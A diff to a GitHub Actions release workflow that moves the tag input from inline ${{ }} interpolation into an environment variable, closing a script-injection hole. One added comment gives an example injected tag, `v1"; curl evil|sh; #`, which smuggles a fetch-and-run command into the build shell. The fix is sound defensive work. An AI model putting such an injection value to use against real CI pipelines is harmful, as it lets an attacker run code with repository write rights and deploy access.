@@ -26,6 +26,13 @@ concurrency:
 env:
   GOTOOLCHAIN: local
   GOFLAGS: -mod=readonly
+  # The dispatch input reaches every script below as an environment variable,
+  # never as a ${{ }} interpolation inside a run block. Interpolation is textual
+  # substitution before bash parses the line, so a tag of `v1"; curl evil|sh; #`
+  # would execute in a job that holds contents: write, packages: write and an
+  # SSH path to the production box. As an env var it is inert: at worst the
+  # build fails on a tag that does not exist.
+  TAG: ${{ github.event.inputs.tag || github.ref_name }}
 
 jobs:
   gate:
@@ -74,7 +81,6 @@ jobs:
           CGO_ENABLED: "0"
         run: |
           set -euo pipefail
-          TAG="${{ github.event.inputs.tag || github.ref_name }}"
           NAME="wlyup_${TAG}_${GOOS}_${GOARCH}${{ matrix.ext }}"
           mkdir -p dist
           # -trimpath and an empty -buildid are what make the output
@@ -119,7 +125,6 @@ jobs:
           GH_TOKEN: ${{ github.token }}
         run: |
           set -euo pipefail
-          TAG="${{ github.event.inputs.tag || github.ref_name }}"
           NOTES=$(mktemp)
           {
             echo "## wlyup ${TAG}"
@@ -182,7 +187,6 @@ jobs:
         shell: bash
         run: |
           set -euo pipefail
-          TAG="${{ github.event.inputs.tag || github.ref_name }}"
           REPO=$(echo "ghcr.io/${GITHUB_REPOSITORY}" | tr '[:upper:]' '[:lower:]')
           docker buildx build \
             -f deploy/Dockerfile \
@@ -260,7 +264,6 @@ jobs:
           USER: ${{ vars.DEPLOY_USER }}
         run: |
           set -euo pipefail
-          TAG="${{ github.event.inputs.tag || github.ref_name }}"
           install -m 600 /dev/null key
           install -m 600 /dev/null known_hosts
           # Strip CR: a secret pasted from Windows carries CRLF and OpenSSH
